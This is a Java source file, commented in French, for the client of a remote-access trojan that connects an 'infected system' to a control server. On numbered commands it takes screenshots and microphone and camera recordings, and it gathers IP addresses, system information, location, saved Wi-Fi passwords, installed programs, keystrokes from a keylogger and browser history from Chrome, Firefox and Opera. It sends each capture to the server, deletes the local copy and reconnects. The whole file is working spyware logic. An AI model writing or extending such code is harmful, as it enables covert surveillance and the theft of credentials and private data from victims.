package main;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.Arrays;

/**
 * Pour que le système infecté soit en communication avec le serveur.
 */
public class Client {

	ObjectInputStream ois;
	ObjectOutputStream oos;
	Socket socket;
	Virus virus = new Virus();
	int serverResponse = 0;
	File temp;

	// Port du serveur
	public static int port = 8031;

	// Addresse IP du serveur
	static String destination = "localhost";

	/**
	 * Débute le fonctionnement du client pour se connecter au serveur. C'est la
	 * fonction principale.
	 * 
	 * @param arg
	 *            Arguments de ligne de commandes.
	 */
	public static void main(String[] arg) {
		new Client();
	}

	/**
	 * Envoie le fichier spécifié.
	 * 
	 * @param test
	 *            Fichier désiré être envoyé.
	 */
	public void sendFile(File test) {
		try {

			// Envoie le nom du fichier
			oos.writeObject(test.getName());

			FileInputStream fis = new FileInputStream(test);
			byte[] buffer = new byte[Server.BUFFER_SIZE];
			Integer bytesRead = 0;

			// Prépare l'envoie du fichier
			while ((bytesRead = fis.read(buffer)) > 0) {
				oos.writeObject(bytesRead);
				oos.writeObject(Arrays.copyOf(buffer, buffer.length));
			}

			// Envoie le fichier
			oos.flush();
			fis.close();
		} catch (IOException e) {
			e.printStackTrace();
			return;
		}
	}

	/**
	 * Contructeur du client.
	 * <p>
	 * <b>Les commandes possibles qui peuvent être reçu :</b>
	 * <ol>
	 * <li>Capturer d'écran
	 * <li>Capturer un enregistrement de microphone
	 * <li>Capturer de caméra
	 * <li>Recevoir les addresses IP du système
	 * <li>Recevoir de l'information du système
	 * <li>Recevoir de l'information sur la localisation du système
	 * <li>Recevoir les mots de passes des réseaux sans-fils
	 * <li>Recevoir une liste de programmes
	 * <li>Activer l'enregistreur de frappes
	 * <li>Recevoir le fichier de frappes
	 * <li>Arrêter l'enregistreur de frappes
	 * <li>Recevoir l'historique de Google Chrome
	 * <li>Recevoir l'historique de Mozilla Firefox
	 * <li>Recevoir l'historique d'Opera
	 * <li>Déconnecter du serveur
	 * </ol>
	 */
	public Client() {

		try {
			// Connexion au serveur
			socket = new Socket(destination, port);

			// Création d'entrée/sortie pour communiquer
			ois = new ObjectInputStream(socket.getInputStream());
			oos = new ObjectOutputStream(socket.getOutputStream());
		} catch (Exception e) {
			e.printStackTrace();
			return;
		}

		// Recevoit l'information du serveur
		try {
			serverResponse = (int) ois.readObject();
		} catch (ClassNotFoundException | IOException e) {
			e.printStackTrace();
		}

		virus.createDir();
		if (serverResponse == 1) {
			// Écran
			temp = virus.captureEcran();
			sendFile(temp);
			virus.destroyFile(virus.ecranFileName);
		} else if (serverResponse == 2) {
			// Microphone
			temp = virus.captureMic();
			sendFile(temp);
			virus.destroyFile(virus.micFileName);
		} else if (serverResponse == 3) {
			// Caméra
			temp = virus.captureCam();
			sendFile(temp);
			virus.destroyFile(virus.camFileName);
		} else if (serverResponse == 4) {
			// Addresses IP
			temp = virus.getIP();
			sendFile(temp);
			virus.destroyFile(virus.ipFileName);
		} else if (serverResponse == 5) {
			// Info système
			temp = virus.getSystemInfo();
			sendFile(temp);
			virus.destroyFile(virus.sysInfoFileName);
		} else if (serverResponse == 6) {
			// Endroit
			temp = virus.getLocation();
			sendFile(temp);
			virus.destroyFile(virus.locationFileName);
		} else if (serverResponse == 7) {
			// Mots de passes Wifi
			temp = virus.getWifiPasswords();
			sendFile(temp);
			virus.destroyFile(virus.wifiFileName);
		} else if (serverResponse == 8) {
			// Programmes
			temp = virus.getPrograms();
			sendFile(temp);
			virus.destroyFile(virus.programFileName);
		} else if (serverResponse == 9) {
			// Activer l'enregistreur de frappes
			virus.keylogger();
		} else if (serverResponse == 10) {
			// Envoie le document de frappes
			temp = virus.getKeylogger();
			sendFile(temp);
			virus.destroyFile(virus.keyFileName);
		} else if (serverResponse == 11) {
			// Arrête l'enregistreur de frappes
			virus.arret();
		} else if (serverResponse == 12) {
			// Historique de Google Chrome
			temp = virus.getBrowserHistory(1);
			sendFile(temp);
			virus.destroyFile(temp.getName());
		} else if (serverResponse == 13) {
			// Historique de Mozilla Firefox
			temp = virus.getBrowserHistory(2);
			sendFile(temp);
			virus.destroyFile(temp.getName());
		} else if (serverResponse == 14) {
			// Historique d'Opera
			temp = virus.getBrowserHistory(3);
			sendFile(temp);
			virus.destroyFile(temp.getName());
		} else if (serverResponse == 15) {
			// Déconnexion
			virus.destroyFile("");
			System.out.println("En cours de déconnexion ...");
			try {
				ois.close();
				oos.close();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

		// Redevient à l'écoute pour le serveur
		if (serverResponse != 15) {
			virus.destroyFile("");
			new Client();
		}

	}
}
